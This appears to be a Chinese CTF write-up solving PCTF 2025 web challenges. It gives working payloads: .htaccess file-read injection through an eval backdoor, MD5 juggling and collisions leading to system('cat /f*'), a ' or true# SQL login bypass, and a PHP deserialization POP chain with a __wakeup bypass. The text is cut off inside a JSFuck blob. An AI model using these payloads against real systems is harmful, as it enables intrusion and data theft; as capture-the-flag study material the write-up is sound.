highlight_file(__FILE__);
@eval($_POST['Wl&come_to!Pctf_2025?']);
```

**分析**

- **Wl&come_to!Pctf_2025?**存在特殊字符要同过URL编码成**Wl%26come_to!Pctf_2025%3f**

**信息搜集**

```shell
POST Wl%26come_to!Pctf_2025%3f=phpinfo();
```

**disable_functions**

```shell
proc_open,pcntl_waitpid,pcntl_wait,dl,ini_restore,mb_send_mail,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,pcntl_alarm,pcntl_sigtimedwait,ini_set,curl_init,curl_setopt,curl_exec
```

**分析**

- 没有禁用**file_put_contents**

- 可以通过上传**.htaccess**读取文件

  ```htaccess
  ErrorDocument 404 "%{file:/love1145141919810}"
  ```

- 然后我们访问一个不存在的路由触发404即可

#### 题目答案

```shell
Wl&come_to!Pctf_2025?=file_put_contents('.htaccess', 'ErrorDocument 404 "%{file:/love1145141919810}"');
```

**分析**

- 需要通过URL编码避免特殊字符

```shell
Wl%26come_to!Pctf_2025%3f%3dfile_put_contents(%27.htaccess%27%2c+%27ErrorDocument+404+%22%25%7bfile%3a%2flove1145141919810%7d%22%27)%3b
```

```shell
PCTF{5a58b313-ad8c-4b1e-971e-648853598529}
```

**得到：PCTF{5a58b313-ad8c-4b1e-971e-648853598529}**



### php_with_md5

#### 题目信息

> ## php_with_md5250 pts
>
> DO you know mmmmmmmd5?

#### 解题过程

**查看题目**

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
echo "Welcome to the PHP world!";
echo "<br>";
echo "Can you get the flag in my php file?";

if(isset($_GET['begin'])=='admin'){
    $begin=$_GET['begin'];
    
    if(!preg_match('/admin/i',$begin)){
        echo "Excellent!";
        
        if($_POST['password']==md5($_POST['password'])){
            echo "Wooow!,you are so clever!";
            
            if($_GET['a']!=$_GET['b'] && md5($_GET['a'])==md5($_GET['b'])){
                echo "Continue!";
                
                if($_GET['c']!=$_GET['d'] && md5($_GET['c'])===md5($_GET['d'])) {
                    echo "Congratulations! You have completely learned the MD5 skills!";
                    @eval($_POST['cmd']);
                    
                }
            }else{ die("Nope,try again!");}
        }else{ die("Haha,try again!");}
    }else{ die("NoNoNO! You can't do that!");}
}else{ die("Oooooooops,You are not admin!");}


?>
```

**分析**

- **isset($_GET['begin'])=='admin'**用**begin=0**
- **$_POST['password']==md5($_POST['password'])**用**password=0e215962017**
- **$_GET['a']!=$_GET['b'] && md5($_GET['a'])==md5($_GET['b'])**用**a=QNKCDZO&b=240610708**
- **$_GET['c']!=$_GET['d'] && md5($_GET['c'])===md5($_GET['d'])**用**c=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&d=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2**
- **@eval($_POST['cmd'])**用**cmd=system('cat /f*');**

#### 题目答案

**得到：PCTF{c30a7cb2-1e55-46a6-adc9-7dee520c4558}**



### sql_in

#### 题目信息

> ## sql_in250 pts
>
> "learn how to get admin?"

#### 解题过程

```shell
username	admin
password	' or true#
```

```shell
🎉 恭喜！
Flag: PCTF{d3cd6662-56d6-4c7e-bf26-4f49ce285378}
```

#### 题目答案

**得到：PCTF{d3cd6662-56d6-4c7e-bf26-4f49ce285378}**



### unserialize

####  题目信息

> ## unserialize250 pts
>
> "php最爱考什么？ 老奶奶又臭又长的裹脚布（确信"

#### 解题过程

```php
<?php
highlight_file(__FILE__);
//flag.php
class Logger {
    public $log_file = 'app.log';
    public $message;
    public function log() {
        file_put_contents($this->log_file, $this->message, FILE_APPEND);
    }
}

class UserProfile {
    public $username;
    public $data = [];
    public function __toString() { return $this->username; }
}

class TemplateEngine {
    public $template_name;
    public function render() { return "Rendering " . $this->template_name; }
}

class ReadFile {
    public $filename;
    public function __wakeup() {
        if (strpos($this->filename, 'flag') !== false) {
            $this->filename = 'index.php';
        }
    }
    public function getFileContent() {
        echo file_get_contents($this->filename);
    }
}

class FileHandler {
    public $source;
    public function __invoke() {
        return $this->source->getFileContent();
    }
}

class TaskRunner {
    private $task;
    public function __construct($task) { $this->task = $task; }
    public function run() {
        call_user_func($this->task);
    }
}

class Middleware {
    public $next;
    public function __destruct() {
        if (isset($this->next)) {
            $this->next->run();
        }
    }
}

if (isset($_GET['data'])) {
    $serialized_data = $_GET['data'];
    try {
        unserialize($serialized_data);
    } catch (Exception $e) {
        echo "Error: " . $e->getMessage();
    }
}
?>
```

**分析**

- 根据它的引导写php序列化脚本，构造pop链
- 我们可以修改序列化ReadFile的参数来绕过wakeup

**编写脚本**

```php
<?php

class ReadFile {
    public $filename = "flag.php";
}
class FileHandler {
    public $source;
}
class TaskRunner {
    public $task;
}
class Middleware {
    public $next;
}

$readFile = new ReadFile();
$fileHandler = new FileHandler();
$taskRunner = new TaskRunner();
$middleware = new Middleware();

$fileHandler->source = $readFile;
$taskRunner->task = $fileHandler;
$middleware->next = $taskRunner;

echo urlencode(serialize($middleware));

?>
```

```shell
O%3A10%3A%22Middleware%22%3A1%3A%7Bs%3A4%3A%22next%22%3BO%3A10%3A%22TaskRunner%22%3A1%3A%7Bs%3A4%3A%22task%22%3BO%3A11%3A%22FileHandler%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A8%3A%22ReadFile%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D%7D
```

**绕过wakeup**

```shell
O%3A10%3A%22Middleware%22%3A1%3A%7Bs%3A4%3A%22next%22%3BO%3A10%3A%22TaskRunner%22%3A1%3A%7Bs%3A4%3A%22task%22%3BO%3A11%3A%22FileHandler%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A8%3A%22ReadFile%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D%7D
```

#### 最终答案

```shell
?data=O%3A10%3A%22Middleware%22%3A1%3A%7Bs%3A4%3A%22next%22%3BO%3A10%3A%22TaskRunner%22%3A1%3A%7Bs%3A4%3A%22task%22%3BO%3A11%3A%22FileHandler%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A8%3A%22ReadFile%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D%7D
```

```shell
<?php
$flag = 'PCTF{50f94f5e-df79-46ad-8d59-da79f6557ce3}'; ?>
```

**得到：PCTF{50f94f5e-df79-46ad-8d59-da79f6557ce3}**



### what_is_jsfuck

#### 题目信息

> ## what_is_jsfuck250 pts
>
> "认识一下，我是js语言，你看到的是我的fuck "

#### 解题过程

**查看源码**

```html
    <!DOCTYPE html>
    <html>
    <head>
        <title>JSFuck Challenge - PCTF 2025</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
            .container { background: #f5f5f5; padding: 20px; border-radius: 5px; }
            input, textarea { width: 100%; padding: 10px; margin: 5px 0; }
            button { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 3px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔐 What is JSFuck ?</h1>

            <p>Enter JavaScript code to encode and execute:</p>
            
            <form>
                <input type="text" name="code" value="" 
                       placeholder="Enter your code here">
                <button type="submit">Encode & Execute</button>
            </form>
            <p>ohno Nothing Happened</p>
            
        </div>
        <!-- Hint:Try entering "I want flag" -->
    </body>
    </html>
```

**测试输入**

```shell
I want flag
```

```js
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+[+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()+[])[!+[]+!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+